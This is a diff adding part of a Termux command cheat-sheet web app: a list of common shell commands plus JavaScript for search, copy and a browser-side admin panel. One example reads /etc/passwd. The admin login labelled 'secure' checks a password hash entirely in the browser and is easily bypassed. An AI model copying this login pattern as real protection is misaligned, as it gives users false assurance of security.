+  {c:'chmod +x script.sh && ./script.sh',d:'Make executable and run a script',e:'',cat:'Scripting'},
+  {c:'#!/bin/bash',d:'Bash shebang line at top of shell scripts',e:'First line of every .sh file',cat:'Scripting'},
+  {c:'for i in {1..10}; do echo $i; done',d:'For loop iterating 1 to 10',e:'',cat:'Scripting'},
+  {c:'while true; do ping host; done',d:'Infinite while loop example',e:'Ctrl+C to stop',cat:'Scripting'},
+  {c:'if [ condition ]; then ... fi',d:'Bash if/then/fi conditional block',e:'',cat:'Scripting'},
+  {c:'crontab -e',d:'Edit scheduled cron jobs',e:'',cat:'Scripting'},
+  {c:'crontab -l',d:'List all current cron jobs',e:'',cat:'Scripting'},
+  {c:'alias ll="ls -la"',d:'Create command alias shortcut',e:'Add to ~/.bashrc for permanent alias',cat:'Scripting'},
+  {c:'which <command>',d:'Show location of an executable command',e:'which python3',cat:'Scripting'},
+  {c:'man <command>',d:'Display manual page for a command',e:'man nmap',cat:'Scripting'},
+  {c:'echo $?',d:'Show exit code of last command (0=success)',e:'',cat:'Scripting'},
+  {c:'python -m http.server 8080',d:'Serve current directory over HTTP port 8080',e:'',cat:'Servers'},
+  {c:'php -S 0.0.0.0:8000',d:'Start PHP built-in web server',e:'',cat:'Servers'},
+  {c:'node server.js',d:'Start a Node.js application',e:'',cat:'Servers'},
+  {c:'npm start',d:'Start npm project via start script',e:'',cat:'Servers'},
+  {c:'ruby -run -e httpd . -p 8000',d:'Start Ruby HTTP server on port 8000',e:'',cat:'Servers'},
+  {c:'sshd',d:'Start Termux SSH server on port 8022',e:'Connect from PC: ssh -p 8022 ...',cat:'Servers'},
+  {c:'nginx',d:'Start Nginx web server',e:'pkg install nginx',cat:'Servers'},
+  {c:'sqlite3 database.db',d:'Open or create SQLite database',e:'pkg install sqlite',cat:'Database'},
+  {c:'.tables',d:'List all tables in SQLite database',e:'Run inside sqlite3 shell',cat:'Database'},
+  {c:'SELECT * FROM table;',d:'Query all rows from a table',e:'Standard SQL query',cat:'Database'},
+  {c:'mysql -u root -p',d:'Connect to MySQL/MariaDB database',e:'pkg install mariadb',cat:'Database'},
+  {c:'mysqldump -u root -p db > db.sql',d:'Backup MySQL database to SQL file',e:'',cat:'Database'},
+  {c:'mysql -u root -p db < db.sql',d:'Restore MySQL database from SQL file',e:'',cat:'Database'},
+  {c:'redis-cli',d:'Connect to Redis database',e:'pkg install redis',cat:'Database'},
+  {c:'gzip file.txt',d:'Compress a file using gzip algorithm',e:'Creates file.txt.gz',cat:'Compression'},
+  {c:'gunzip file.txt.gz',d:'Decompress a gzip compressed file',e:'',cat:'Compression'},
+  {c:'bzip2 file.txt',d:'Compress file with bzip2 (better ratio)',e:'Creates file.txt.bz2',cat:'Compression'},
+  {c:'bunzip2 file.txt.bz2',d:'Decompress a bzip2 compressed file',e:'',cat:'Compression'},
+  {c:'tar -czf archive.tar.gz folder/',d:'Create gzip-compressed tar archive',e:'',cat:'Compression'},
+  {c:'tar -xzf archive.tar.gz',d:'Extract a tar.gz archive',e:'',cat:'Compression'},
+  {c:'tar -cjf archive.tar.bz2 folder/',d:'Create bzip2-compressed tar archive',e:'',cat:'Compression'},
+  {c:'zip -r archive.zip folder/',d:'Create zip archive from folder',e:'',cat:'Compression'},
+  {c:'unzip archive.zip -d /dest',d:'Extract zip to specific directory',e:'',cat:'Compression'},
+  {c:'7z x archive.7z',d:'Extract 7-zip archive',e:'pkg install p7zip',cat:'Compression'},
+  {c:'echo "text" | md5sum',d:'Generate MD5 hash of text input',e:'',cat:'Crypto & Hash'},
+  {c:'echo "text" | sha256sum',d:'Generate SHA-256 hash of text',e:'',cat:'Crypto & Hash'},
+  {c:'echo "text" | sha512sum',d:'Generate SHA-512 hash of text',e:'',cat:'Crypto & Hash'},
+  {c:'md5sum file.txt',d:'Get MD5 checksum of a file',e:'Verify file integrity',cat:'Crypto & Hash'},
+  {c:'openssl rand -hex 32',d:'Generate random 32-byte hex string',e:'Use for API keys or tokens',cat:'Crypto & Hash'},
+  {c:'openssl rand -base64 32',d:'Generate random base64 encoded key',e:'',cat:'Crypto & Hash'},
+  {c:'openssl enc -aes-256-cbc -in f -out f.enc',d:'Encrypt file using AES-256-CBC',e:'-k password flag needed',cat:'Crypto & Hash'},
+  {c:'openssl enc -d -aes-256-cbc -in f.enc',d:'Decrypt AES-256 encrypted file',e:'',cat:'Crypto & Hash'},
+  {c:'base64 <<< "hello world"',d:'Base64 encode a text string',e:'',cat:'Crypto & Hash'},
+  {c:'echo "aGVsbG8=" | base64 -d',d:'Base64 decode a string',e:'',cat:'Crypto & Hash'},
+  {c:'gpg --gen-key',d:'Generate a new GPG key pair',e:'pkg install gnupg',cat:'Crypto & Hash'},
+  {c:'gpg --encrypt -r user file',d:'Encrypt file using GPG public key',e:'',cat:'Crypto & Hash'},
+  {c:'gpg --decrypt file.gpg',d:'Decrypt a GPG encrypted file',e:'',cat:'Crypto & Hash'},
+  {c:'grep "text" <file>',d:'Search for text pattern in a file',e:'',cat:'Text Processing'},
+  {c:'grep -r "text" .',d:'Recursively search all files in directory',e:'',cat:'Text Processing'},
+  {c:'grep -i "text" <file>',d:'Case-insensitive text search',e:'',cat:'Text Processing'},
+  {c:'grep -n "text" <file>',d:'Show line numbers with matching lines',e:'',cat:'Text Processing'},
+  {c:'grep -v "text" <file>',d:'Show lines NOT matching the pattern',e:'',cat:'Text Processing'},
+  {c:'grep -E "pat1|pat2" file',d:'Search for multiple patterns using OR',e:'',cat:'Text Processing'},
+  {c:"awk '{print $1}' <file>",d:'Print first column of each line',e:'Space-delimited by default',cat:'Text Processing'},
+  {c:"awk -F':' '{print $1}' /etc/passwd",d:'Print first field with custom separator',e:'',cat:'Text Processing'},
+  {c:"sed 's/old/new/g' file",d:'Replace all occurrences of text in file',e:'',cat:'Text Processing'},
+  {c:"sed -i 's/old/new/g' file",d:'Edit file in-place with sed substitution',e:'',cat:'Text Processing'},
+  {c:'sort <file>',d:'Sort file lines alphabetically',e:'',cat:'Text Processing'},
+  {c:'sort -n <file>',d:'Sort file lines numerically',e:'',cat:'Text Processing'},
+  {c:'sort -r <file>',d:'Sort file lines in reverse order',e:'',cat:'Text Processing'},
+  {c:'uniq <file>',d:'Remove duplicate adjacent lines',e:'Sort first for best results',cat:'Text Processing'},
+  {c:'uniq -c <file>',d:'Count occurrences of each unique line',e:'',cat:'Text Processing'},
+  {c:'cut -d":" -f1 <file>',d:'Cut first field by specified delimiter',e:'',cat:'Text Processing'},
+  {c:'tr "[:lower:]" "[:upper:]"',d:'Translate lowercase to uppercase characters',e:'echo text | tr ...',cat:'Text Processing'},
+  {c:'wc -l <file>',d:'Count number of lines in file',e:'',cat:'Text Processing'},
+  {c:'wc -w <file>',d:'Count number of words in file',e:'',cat:'Text Processing'},
+  {c:'sl',d:'Steam Locomotive animation in terminal 🚂',e:'pkg install sl',cat:'Fun & Extras'},
+  {c:'figlet "Hello World"',d:'Generate large ASCII art text banner',e:'pkg install figlet',cat:'Fun & Extras'},
+  {c:'toilet "Termux"',d:'Colorful styled ASCII art text',e:'pkg install toilet',cat:'Fun & Extras'},
+  {c:'cowsay "Hello!"',d:'Display message from a talking cow 🐄',e:'pkg install cowsay',cat:'Fun & Extras'},
+  {c:'fortune | cowsay',d:'Random wise quote spoken by a cow',e:'pkg install fortune cowsay',cat:'Fun & Extras'},
+  {c:'fortune',d:'Display a random wise or humorous quote',e:'pkg install fortune',cat:'Fun & Extras'},
+  {c:'cmatrix',d:'Matrix-style digital rain terminal effect',e:'pkg install cmatrix',cat:'Fun & Extras'},
+  {c:'cmatrix -C red',d:'Matrix rain animation in red color',e:'',cat:'Fun & Extras'},
+  {c:'lolcat',d:'Add rainbow colors to any terminal output',e:'pkg install lolcat',cat:'Fun & Extras'},
+  {c:'neofetch | lolcat',d:'Display system info with rainbow colors',e:'',cat:'Fun & Extras'},
+  {c:'figlet "HACKED" | lolcat',d:'Rainbow colored ASCII art banner',e:'',cat:'Fun & Extras'},
+  {c:'cat /dev/urandom | strings | head',d:'Stream random characters — looks like hacking 😄',e:'Just for fun!',cat:'Fun & Extras'},
+  {c:'yes "hacking..." | head -50',d:'Print text repeatedly 50 times',e:'',cat:'Fun & Extras'},
+  {c:'espeak "Hello World"',d:'Text-to-speech output in terminal',e:'pkg install espeak',cat:'Fun & Extras'},
+  {c:'aafire',d:'ASCII fire animation in the terminal 🔥',e:'pkg install aalib',cat:'Fun & Extras'},
+  {c:'apt-get moo',d:'Hidden Easter egg ASCII cow in apt 🐄',e:'A classic Linux Easter egg',cat:'Fun & Extras'},
+  {c:'banner "TermuxKit"',d:'Simple ASCII text banner generator',e:'pkg install sysvbanner',cat:'Fun & Extras'},
+  {c:'tput colors',d:'Show number of colors supported by terminal',e:'',cat:'Fun & Extras'},
+];
+
+// ✅ DATA = BASE_DATA + localStorage commands merged
+let DATA = [...BASE_DATA];
+
+function loadLocalCommands() {
+  try {
+    const stored = localStorage.getItem('termuxkit_extra_cmds');
+    if (stored) {
+      const extra = JSON.parse(stored);
+      if (Array.isArray(extra)) {
+        DATA = [...BASE_DATA, ...extra.map(x => ({...x, _local: true}))];
+      }
+    }
+  } catch(e) { /* ignore */ }
+}
+loadLocalCommands();
+
+let activeCat='All', searchQ='', currentView='grid', isAdmin=false;
+
+function getFiltered(){
+  let d=DATA;
+  if(activeCat!=='All') d=d.filter(x=>x.cat===activeCat);
+  if(searchQ) d=d.filter(x=>x.c.toLowerCase().includes(searchQ)||x.d.toLowerCase().includes(searchQ)||x.cat.toLowerCase().includes(searchQ));
+  return d;
+}
+
+function renderSidebar(){
+  const sb=document.getElementById('sidebar');
+  const counts={};
+  DATA.forEach(x=>{counts[x.cat]=(counts[x.cat]||0)+1;});
+  let html='<div class="sb-head">Categories</div>';
+  html+=`<div class="cat-item${activeCat==='All'?' active':''}" onclick="setCat('All')">
+    <div class="cat-name">⚡ All Commands</div><div class="cat-count">${DATA.length}</div></div>`;
+  Object.entries(CATS).forEach(([name,info])=>{
+    const cnt=counts[name]||0; if(!cnt) return;
+    html+=`<div class="cat-item${activeCat===name?' active':''}" onclick="setCat('${name.replace(/'/g,"\\'")}')">
+      <div class="cat-name">${info.icon} ${name}</div><div class="cat-count">${cnt}</div></div>`;
+  });
+  sb.innerHTML=html;
+}
+
+function renderGrid(data){
+  document.getElementById('cmdGrid').innerHTML=data.map(row=>{
+    const cat=CATS[row.cat]||{color:'#00ff88',icon:'?'};
+    return `<article class="cmd-card" style="--card-color:${cat.color}">
+      <div class="card-accent"></div>
+      <div class="card-top">
+        <div class="card-cmd">${esc(row.c)}</div>
+        <button class="card-copy" onclick="copyIt(this,${JSON.stringify(row.c)})">copy</button>
+      </div>
+      <div class="card-desc">${esc(row.d)}${row.e?`<span class="card-example">💡 ${esc(row.e)}</span>`:''}</div>
+      <div class="card-footer">
+        <span class="cat-tag" style="background:${cat.color}18;color:${cat.color};border:1px solid ${cat.color}30">${cat.icon} ${row.cat}</span>
+        ${row._local?'<span style="font-size:.6rem;color:var(--yellow);margin-left:auto;border:1px solid rgba(251,191,36,.3);padding:1px 6px;border-radius:4px">local</span>':''}
+      </div></article>`;
+  }).join('');
+}
+
+function renderTableView(data){
+  document.getElementById('cmdTableBody').innerHTML=data.map(row=>{
+    const cat=CATS[row.cat]||{color:'#00ff88',icon:'?'};
+    return `<tr class="cmd-row">
+      <td><span class="code-cell">${esc(row.c)}</span></td>
+      <td class="desc-cell">${esc(row.d)}${row.e?`<span class="ex-cell">💡 ${esc(row.e)}</span>`:''}</td>
+      <td><span class="cat-tag" style="background:${cat.color}18;color:${cat.color};border:1px solid ${cat.color}30">${cat.icon} ${row.cat}</span></td>
+      <td><button class="tbl-copy" onclick="copyIt(this,${JSON.stringify(row.c)})">copy</button></td></tr>`;
+  }).join('');
+}
+
+function renderAll(){
+  const data=getFiltered();
+  const empty=document.getElementById('emptyState');
+  document.getElementById('resultCount').textContent=`${data.length} commands`;
+  const title=activeCat==='All'?'⚡ All Commands':(CATS[activeCat]?.icon+' '+activeCat);
+  document.getElementById('sectionTitle').textContent=title;
+  if(!data.length){document.getElementById('cmdGrid').innerHTML='';document.getElementById('cmdTableBody').innerHTML='';empty.style.display='block';return;}
+  empty.style.display='none';
+  renderGrid(data); renderTableView(data);
+}
+
+function setView(v){
+  currentView=v;
+  const grid=document.getElementById('cmdGrid'), table=document.getElementById('cmdTable');
+  document.getElementById('vbtnGrid').classList.toggle('active',v==='grid');
+  document.getElementById('vbtnTable').classList.toggle('active',v==='table');
+  grid.style.display=v==='grid'?'grid':'none';
+  table.style.display=v==='table'?'table':'none';
+}
+
+function setCat(cat){
+  activeCat=cat; searchQ=''; document.getElementById('searchInput').value='';
+  renderSidebar(); renderAll(); window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function doSearch(){
+  searchQ=document.getElementById('searchInput').value.toLowerCase().trim();
+  activeCat='All'; renderSidebar(); renderAll();
+}
+
+function copyIt(btn,cmd){
+  navigator.clipboard.writeText(cmd).then(()=>{
+    btn.textContent='✓'; btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='copy'; btn.classList.remove('ok');},1500);
+    showToast('✓ Copied: '+cmd.substring(0,35));
+  }).catch(()=>{btn.textContent='✓'; setTimeout(()=>btn.textContent='copy',1500);});
+}
+
+function showToast(msg){
+  const t=document.getElementById('toast'); t.textContent=msg; t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2200);
+}
+
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+
+// ====================================================
+// ✅ SECURE ADMIN AUTH
+// ====================================================
+function openLogin(){
+  if(isAdmin){openAdmin();return;}
+  const now=Date.now();
+  if(now < lockoutUntil){
+    const secs=Math.ceil((lockoutUntil-now)/1000);
+    showLockout(`🔒 Too many attempts. Wait ${secs}s`);
+    return;
+  }
+  document.getElementById('loginModal').classList.add('open');
+  document.getElementById('loginErr').classList.remove('show');
+  document.getElementById('lockoutWarn').classList.remove('show');
+  setTimeout(()=>document.getElementById('adminPass').focus(),100);
+}
+
+function closeLogin(){
+  document.getElementById('loginModal').classList.remove('open');
+  document.getElementById('adminPass').value='';
+}
+
+function showLockout(msg){
+  const el=document.getElementById('lockoutWarn');
+  el.textContent=msg; el.classList.add('show');
+}
+
+async function doLogin(){
+  const now=Date.now();
+  if(now < lockoutUntil){
+    const secs=Math.ceil((lockoutUntil-now)/1000);
+    showLockout(`🔒 Locked out. Try again in ${secs}s`);
+    return;
+  }
+
+  const passInput=document.getElementById('adminPass');
+  const pass=passInput.value;
+  if(!pass) return;
+
+  // Disable button during async hash
+  const btn=document.getElementById('loginBtn');
+  btn.disabled=true; btn.textContent='Checking...';
+
+  try {
+    const hash=await sha256(pass);
+    if(hash===ADMIN_HASH){
+      // ✅ Login success
+      loginAttempts=0;
+      isAdmin=true;
+      closeLogin();
+      openAdmin();
+      document.getElementById('adminToggleBtn').classList.add('on');
+      document.getElementById('adminToggleBtn').textContent='⚙️ Admin ✓';
+    } else {
+      // ❌ Login fail
+      loginAttempts++;
+      passInput.value='';
+      document.getElementById('loginErr').classList.add('show');
+
+      if(loginAttempts >= MAX_ATTEMPTS){
+        lockoutUntil=Date.now()+LOCKOUT_MS;
+        loginAttempts=0;
+        closeLogin();
+        showToast('🔒 Too many failed attempts. Locked for 60s.');
+      } else {
+        showLockout(`⚠️ Attempt ${loginAttempts}/${MAX_ATTEMPTS}`);
+      }
+      passInput.focus();
+    }
+  } catch(e) {
+    console.error('Auth error:', e);
+  } finally {
+    btn.disabled=false; btn.textContent='Login →';
+  }
+}
+
+function openAdmin(){
+  document.getElementById('adminOverlay').classList.add('open');
+  startSessionTimer();
+  updateDash(); renderAdminTable(); renderCatGrid(); populateCatSelect();
+}
+
+function logoutAdmin(){
+  isAdmin=false;
+  clearInterval(sessionTimerInterval);
+  document.getElementById('adminOverlay').classList.remove('open');
+  document.getElementById('adminToggleBtn').classList.remove('on');
+  document.getElementById('adminToggleBtn').textContent='⚙️ Admin';
+  renderSidebar(); renderAll();
+  document.getElementById('totalCmds').textContent=DATA.length;
+  document.getElementById('countBadge').textContent=DATA.length+' commands';
+  showToast('👋 Logged out of admin');
+}
+
+// ✅ Session timer — auto-logout after 30min inactivity
+function startSessionTimer(){
+  clearInterval(sessionTimerInterval);
+  sessionExpiry=Date.now()+SESSION_TIMEOUT_MS;
+
+  // Reset on any interaction inside admin
+  document.getElementById('adminOverlay').addEventListener('mousemove', resetSessionTimer, {passive:true});
+  document.getElementById('adminOverlay').addEventListener('keydown', resetSessionTimer, {passive:true});
+
+  sessionTimerInterval=setInterval(()=>{
+    const remaining=sessionExpiry-Date.now();
+    if(remaining<=0){
+      clearInterval(sessionTimerInterval);
+      logoutAdmin();
+      showToast('⏱ Session expired — logged out');
+      return;
+    }
+    const mins=Math.floor(remaining/60000);
+    const secs=Math.floor((remaining%60000)/1000);
+    const label=`⏱ ${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+    const el=document.getElementById('sessionTimer');
+    el.textContent=label;
+    el.classList.toggle('warn', remaining < 5*60*1000); // warn at 5min
+  }, 1000);
+}
+
+function resetSessionTimer(){
+  sessionExpiry=Date.now()+SESSION_TIMEOUT_MS;
+}
+
+function showAdminTab(id,el){
+  document.querySelectorAll('.admin-section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.admin-nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById('as-'+id).classList.add('active'); el.classList.add('active');
+  if(id==='manage') renderAdminTable();
+  if(id==='categories') renderCatGrid();
+  if(id==='dashboard') updateDash();
+}
+
+function updateDash(){
+  document.getElementById('adTotal').textContent=DATA.length;
+  document.getElementById('adCats').textContent=Object.keys(CATS).length;
+  const counts={};
+  DATA.forEach(x=>{counts[x.cat]=(counts[x.cat]||0)+1;});
+  let html='';
+  Object.entries(counts).sort((a,b)=>b[1]-a[1]).forEach(([cat,cnt])=>{
+    const info=CATS[cat]||{color:'#00ff88'};
+    const pct=Math.round((cnt/DATA.length)*100);
+    html+=`<div style="margin-bottom:10px">
+      <div style="display:flex;justify-content:space-between;font-size:.75rem;color:var(--text2);margin-bottom:4px">
+        <span>${info.icon||''} ${cat}</span><span style="color:var(--muted)">${cnt}</span></div>
+      <div style="height:4px;background:var(--border);border-radius:2px;overflow:hidden">
+        <div style="height:100%;width:${pct}%;background:${info.color};border-radius:2px"></div></div></div>`;
+  });
+  document.getElementById('catBreakdown').innerHTML=html;
+}
+
+function populateCatSelect(){
+  document.getElementById('newCat').innerHTML=Object.keys(CATS).map(c=>`<option value="${esc(c)}">${c}</option>`).join('');
+}
+
+function addCommand(){
+  const cmd=document.getElementById('newCmd').value.trim();
+  const desc=document.getElementById('newDesc').value.trim();
+  const ex=document.getElementById('newEx').value.trim();
+  const cat=document.getElementById('newCat').value;
+  if(!cmd||!desc||!cat){alert('Command, Description and Category are required!');return;}
+
+  const newEntry={c:cmd,d:desc,e:ex,cat:cat,_local:true};
+  DATA.push(newEntry);
+
+  // ✅ Save to localStorage so it persists across refreshes
+  try {
+    const stored=JSON.parse(localStorage.getItem('termuxkit_extra_cmds')||'[]');
+    stored.push({c:cmd,d:desc,e:ex,cat:cat});
+    localStorage.setItem('termuxkit_extra_cmds',JSON.stringify(stored));
+  } catch(err) { console.error('localStorage save failed:', err); }
+
+  document.getElementById('newCmd').value='';
+  document.getElementById('newDesc').value='';
+  document.getElementById('newEx').value='';
+  const msg=document.getElementById('addSuccess'); msg.classList.add('show');
+  setTimeout(()=>msg.classList.remove('show'),3000);
+  updateDash();
+  document.getElementById('totalCmds').textContent=DATA.length;
+  document.getElementById('countBadge').textContent=DATA.length+' commands';
+}
+
+function clearLocalCommands(){
+  if(!confirm('Clear all locally added commands? (Built-in commands are safe)')) return;
+  localStorage.removeItem('termuxkit_extra_cmds');
+  DATA=[...BASE_DATA];
+  renderAdminTable(); updateDash();
+  document.getElementById('totalCmds').textContent=DATA.length;
+  document.getElementById('countBadge').textContent=DATA.length+' commands';
+  showToast('✓ Local commands cleared');
+}
+
+function renderAdminTable(){
+  const q=(document.getElementById('adminSearch')?.value||'').toLowerCase();
+  const rows=DATA.filter(x=>!q||x.c.toLowerCase().includes(q)||x.d.toLowerCase().includes(q)||x.cat.toLowerCase().includes(q));
+  document.getElementById('adminTableBody').innerHTML=rows.map((row)=>{
+    const ri=DATA.indexOf(row);
+    const isLocal=!!row._local;
+    return `<tr><td style="color:var(--muted)">${ri+1}</td>
+      <td><span style="font-family:var(--mono);color:var(--green);font-size:.75rem">${esc(row.c)}</span></td>
+      <td style="font-size:.77rem">${esc(row.d)}</td>
+      <td><span style="font-size:.7rem;color:var(--text2)">${CATS[row.cat]?.icon||''} ${row.cat}</span></td>
+      <td><span style="font-size:.65rem;padding:2px 7px;border-radius:4px;
+        background:${isLocal?'rgba(251,191,36,.1)':'rgba(0,255,136,.06)'};
+        color:${isLocal?'var(--yellow)':'var(--muted)'};
+        border:1px solid ${isLocal?'rgba(251,191,36,.2)':'var(--border)'}">
+        ${isLocal?'local':'built-in'}</span></td>
+      <td>${isLocal?`<button class="del-btn" onclick="deleteCmd(${ri})">del</button>`:
+        '<span style="font-size:.65rem;color:var(--muted)">locked</span>'}</td></tr>`;
+  }).join('');
+}
+
+function deleteCmd(idx){
+  if(!DATA[idx]._local){showToast('⚠️ Cannot delete built-in commands');return;}
+  if(!confirm(`Delete: "${DATA[idx].c}"?`)) return;
+
+  // Remove from localStorage
+  try {
+    const stored=JSON.parse(localStorage.getItem('termuxkit_extra_cmds')||'[]');
+    const cmdToRemove=DATA[idx].c;
+    const updated=stored.filter(x=>x.c!==cmdToRemove);
+    localStorage.setItem('termuxkit_extra_cmds',JSON.stringify(updated));
+  } catch(e) {}
+
+  DATA.splice(idx,1);
+  renderAdminTable(); updateDash();
+  showToast('Command deleted');
+}
+
+function renderCatGrid(){
+  const counts={};
+  DATA.forEach(x=>{counts[x.cat]=(counts[x.cat]||0)+1;});
+  document.getElementById('catGrid').innerHTML=Object.entries(CATS).map(([name,info])=>`
+    <div style="background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:16px;border-left:3px solid ${info.color}">
+      <div style="font-size:1.4rem;margin-bottom:6px">${info.icon}</div>
+      <div style="font-size:.82rem;color:var(--text);font-weight:600;margin-bottom:4px">${name}</div>
+      <div style="font-size:1.2rem;font-weight:800;color:${info.color};font-family:var(--display)">${counts[name]||0}</div>
+      <div style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px">commands</div></div>`).join('');
+}
+
+// ====== INIT ======
+document.getElementById('totalCmds').textContent=DATA.length;
+document.getElementById('totalCats').textContent=Object.keys(CATS).length;
+document.getElementById('countBadge').textContent=DATA.length+' commands';
+renderSidebar(); renderAll(); setView('grid');
+
+window.addEventListener('scroll',()=>{
+  document.getElementById('btt').classList.toggle('visible',window.scrollY>400);
+});
+</script>
+</body>
+</html>
